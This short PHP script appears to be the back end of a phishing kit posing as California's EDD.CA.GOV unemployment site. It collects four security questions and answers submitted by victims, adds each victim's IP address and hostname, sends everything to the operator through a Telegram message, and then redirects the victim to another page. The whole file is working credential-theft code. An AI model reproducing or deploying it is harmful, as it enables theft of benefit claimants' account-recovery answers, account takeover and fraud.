<?php
include 'blocker.php';
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$message .= "First  Question : " .$_POST['q1']."\n\n";
$message .= "First    Answer : " .$_POST['a1']."\n\n";
$message .= "Second Question : " .$_POST['q2']."\n\n";
$message .= "Second   Answer : " .$_POST['a2']."\n\n";
$message .= "Third  Question : " .$_POST['q3']."\n\n";
$message .= "Third    Answer : " .$_POST['a3']."\n\n";
$message .= "Fourth  Question: " .$_POST['q4']."\n\n";
$message .= "Fourth    Answer: " .$_POST['a4']."\n\n";
$message .= "----Eddd.caa-----Security--Question--Answer------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "-----Eddd.caa---Mad------\n";
$subject = "EDD.CA.GOV---QUESTION AND ANSWER\r\n\r\n".$message;
send_telegram_msg($message);
header("Location: --==++.php");

?>